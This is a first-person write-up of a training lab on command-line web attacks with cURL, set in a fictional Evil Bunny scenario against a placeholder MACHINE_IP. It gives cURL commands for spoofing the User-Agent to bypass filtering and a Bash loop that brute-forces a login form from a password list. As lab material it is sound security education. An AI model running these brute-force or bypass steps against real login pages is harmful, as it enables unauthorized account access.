## Day 24 – Exploitation with cURL (Command-Line Web Attacks)

### Scenario Overview

Blue-team intelligence revealed that the wormhole allowing Evil Bunny reinforcements was controlled through a **web-based control panel** hosted on the Evil Bunnies’ server. Before confronting King Malhare, the team needed to locate and disable this control panel.

The challenge:
There was **no browser, no Burp Suite, and no GUI tools** available — only a terminal. To proceed, all interaction with the web application had to be done by **manually crafting HTTP requests using cURL**.

---

### My Role

I acted as a **Web Exploitation Analyst**, responsible for:

* Interacting with a web application using only command-line tools.
* Manually crafting HTTP GET and POST requests.
* Handling cookies and sessions to maintain authenticated access.
* Automating repetitive HTTP requests to simulate brute-force attacks.
* Identifying and bypassing basic defensive checks such as User-Agent filtering.

---

### Investigative / Exploitation Approach

1. **Initial Reconnaissance with GET Requests**
   I began by sending basic HTTP GET requests using cURL to observe raw HTML responses and understand how the server responded without a browser.

2. **Manual Form Submission via POST Requests**
   I simulated login attempts by crafting POST requests that mirrored how HTML forms send credentials to the server.

3. **Session Handling Using Cookies**
   After identifying session cookies set by the server, I saved and replayed them to maintain authenticated access across multiple requests.

4. **Automation and Brute Forcing**
   I created a Bash loop that repeatedly sent POST requests with different passwords, mimicking how automated tools brute-force login forms.

5. **Bypassing User-Agent Restrictions**
   When the application blocked cURL-based requests, I spoofed the User-Agent header to bypass basic client filtering mechanisms.

6. **(Bonus) Control Panel Exploitation**
   Using the same techniques, the control panel endpoint could be authenticated against and used to issue the command that shut down the wormhole.

---

### Commands Used (Reference Table)

| Purpose                   | Command                                                                                |
| ------------------------- | -------------------------------------------------------------------------------------- |
| Basic GET request         | `curl http://MACHINE_IP/`                                                              |
| Send POST request         | `curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php`             |
| View headers and response | `curl -i http://MACHINE_IP/post.php`                                                   |
| Save session cookies      | `curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php` |
| Reuse cookies             | `curl -b cookies.txt http://MACHINE_IP/session.php`                                    |
| Silent POST request       | `curl -s -X POST -d "username=admin&password=pass" http://MACHINE_IP/bruteforce.php`   |
| Spoof User-Agent          | `curl -A "internalcomputer" http://MACHINE_IP/ua_check.php`                            |
| Confirm UA restriction    | `curl -i http://MACHINE_IP/ua_check.php`                                               |

---

### Automation Script Used

| Purpose                | Bash Script |
| ---------------------- | ----------- |
| Brute-force login form |             |

````bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
``` |

---

### Key Findings
- HTTP requests can be fully crafted and controlled without a browser.
- POST requests mirror how login forms submit credentials.
- Session cookies are the key mechanism for maintaining authentication.
- Repetitive HTTP requests form the foundation of brute-force attacks.
- Simple User-Agent checks are ineffective and easily bypassed.
- cURL-based attacks replicate the core logic behind tools like **Hydra**, **Burp Intruder**, and **WFuzz**.

---

### Outcome
Using only cURL and basic Bash scripting, I successfully:
- Interacted with a live web application at the HTTP level.
- Authenticated and maintained sessions without browser support.
- Automated login attempts to identify valid credentials.
- Demonstrated how attackers can exploit web applications even in restricted environments.

This exercise reinforced that **web exploitation is fundamentally about understanding and manipulating HTTP**, not relying on graphical tools.

---

### Skills & Concepts Learned
- Understanding HTTP requests and responses at a low level
- Crafting GET and POST requests manually
- Managing cookies and sessions via command-line tools
- Automating web attacks using Bash and cURL
- User-Agent spoofing and basic defense bypass techniques
- Thinking like both an attacker and defender in web environments

---
